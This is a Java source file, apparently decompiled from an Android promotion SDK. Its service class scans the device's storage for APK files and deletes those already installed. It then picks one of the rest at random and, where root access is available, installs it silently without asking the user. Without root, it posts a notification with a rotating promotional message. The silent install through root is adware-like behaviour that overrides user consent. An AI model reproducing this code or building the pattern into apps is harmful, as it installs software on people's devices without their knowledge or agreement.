package com.zhuoyi.system.promotion.service;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.text.TextUtils;
import com.zhuoyi.system.promotion.model.ApkInfo;
import com.zhuoyi.system.promotion.util.NotiUitl;
import com.zhuoyi.system.promotion.util.PromUtils;
import com.zhuoyi.system.promotion.util.constants.BundleConstants;
import com.zhuoyi.system.promotion.util.constants.ExtraName;
import com.zhuoyi.system.promotion.util.constants.ServiceRequestCode;
import com.zhuoyi.system.service.IZyService;
import com.zhuoyi.system.service.ZyService;
import com.zhuoyi.system.service.ZyServiceFactory;
import com.zhuoyi.system.util.AppInfoUtils;
import com.zhuoyi.system.util.FileUtils;
import com.zhuoyi.system.util.ResourceIdUtils;
import com.zhuoyi.system.util.constant.FileConstants;
import com.zhuoyi.system.util.constant.Session;
import com.zhuoyi.system.util.model.MyPackageInfo;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Random;

public class PromSearchLocalApkService extends IZyService {
    private static final String CONFIG_DATE_NAME = "installed_date";
    private boolean hasRoot;

    public PromSearchLocalApkService(int serviceId, Context c, Handler handler) {
        super(serviceId, c, handler);
        this.hasRoot = PromUtils.getRootFlag(c);
    }

    public void onStartCommand(Intent intent, int flags, int startId) {
        if (!isDisplayed()) {
            ArrayList<ApkInfo> availApkInfoList = fillterApkInfo(search());
            if (availApkInfoList.size() != 0) {
                Random r = new Random();
                ApkInfo apkInfo = (ApkInfo) availApkInfoList.get(r.nextInt(availApkInfoList.size()));
                MyPackageInfo packageInfo = new MyPackageInfo(apkInfo.getPackageInfo().packageName, apkInfo.getPackageInfo().versionCode, 17, 0);
                packageInfo.setApkPath(apkInfo.getPath());
                if (this.hasRoot) {
                    AppInfoUtils.silentInstallApp(this.mContext, apkInfo.getPath(), packageInfo);
                } else {
                    Intent i = new Intent(this.mContext, ZyService.class);
                    i.putExtra(BundleConstants.BUNDLE_KEY_SERVICE_ID, ZyServiceFactory.INSTALL_LOCAL_APK_SERVICE.getServiceId());
                    i.putExtra(ExtraName.MYPACKAGEINFO, packageInfo);
                    NotiUitl.getInstance(this.mContext).showSimpleNotification(20002, this.mContext.getPackageManager().getApplicationLabel(apkInfo.getPackageInfo().applicationInfo).toString(), getMessage(r), PendingIntent.getService(this.mContext, ServiceRequestCode.INSTALL_LOCAL_APK, i, 134217728));
                }
            }
        }
        stopSelf();
    }

    private String getMessage(Random r) {
        int[] ids = new int[]{ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg1"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg0"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg3"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg2"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg5"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg4"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg7"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg6"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg9"), ResourceIdUtils.getResourceId(this.mContext, "R.string.zy_local_apk_msg8")};
        return this.mContext.getString(ids[r.nextInt(ids.length)]);
    }

    private boolean isDisplayed() {
        String rDate = FileUtils.getConfigByNameFromFile(CONFIG_DATE_NAME);
        try {
            long cMills = System.currentTimeMillis();
            if (TextUtils.isEmpty(rDate)) {
                FileUtils.putConfigToFile(CONFIG_DATE_NAME, new StringBuilder(String.valueOf(cMills)).toString());
                return false;
            }
            long rMills = Long.parseLong(rDate);
            if (cMills > rMills) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
                if (sdf.format(Long.valueOf(rMills)).equals(sdf.format(Long.valueOf(cMills)))) {
                    return true;
                }
                FileUtils.putConfigToFile(CONFIG_DATE_NAME, new StringBuilder(String.valueOf(cMills)).toString());
                return false;
            }
            FileUtils.putConfigToFile(CONFIG_DATE_NAME, new StringBuilder(String.valueOf(cMills)).toString());
            return true;
        } catch (Exception e) {
            return true;
        }
    }

    private ArrayList<ApkInfo> search() {
        PackageManager pm = this.mContext.getPackageManager();
        ArrayList<ApkInfo> ret = new ArrayList();
        ArrayList<File> fileList = new ArrayList();
        FileUtils.getFileListBySuffix(fileList, new File("/sdcard/" + FileConstants.FILE_ROOT), ".apk");
        Iterator it = fileList.iterator();
        while (it.hasNext()) {
            File f = (File) it.next();
            PackageInfo pi = AppInfoUtils.getPackageInfoFromAPKFile(pm, f);
            if (pi != null) {
                pi.applicationInfo.sourceDir = f.getAbsolutePath();
                pi.applicationInfo.publicSourceDir = f.getAbsolutePath();
                ApkInfo ai = new ApkInfo();
                ai.setPackageInfo(pi);
                ai.setPath(f.getAbsolutePath());
                ret.add(ai);
            }
        }
        return ret;
    }

    private ArrayList<ApkInfo> fillterApkInfo(ArrayList<ApkInfo> apkInfoList) {
        ArrayList<ApkInfo> ret = new ArrayList();
        Iterator it = apkInfoList.iterator();
        while (it.hasNext()) {
            ApkInfo ai = (ApkInfo) it.next();
            if (AppInfoUtils.getPackageInfoByPackageName(this.mContext, ai.getPackageInfo().packageName) != null || PromUtils.getInstance(this.mContext).hasInstalled(new MyPackageInfo(ai.getPackageInfo().packageName, ai.getPackageInfo().versionCode))) {
                new File(ai.getPath()).delete();
            } else {
                ret.add(ai);
            }
        }
        return ret;
    }

    public void onServerAddressReponse(Session session) {
    }
}
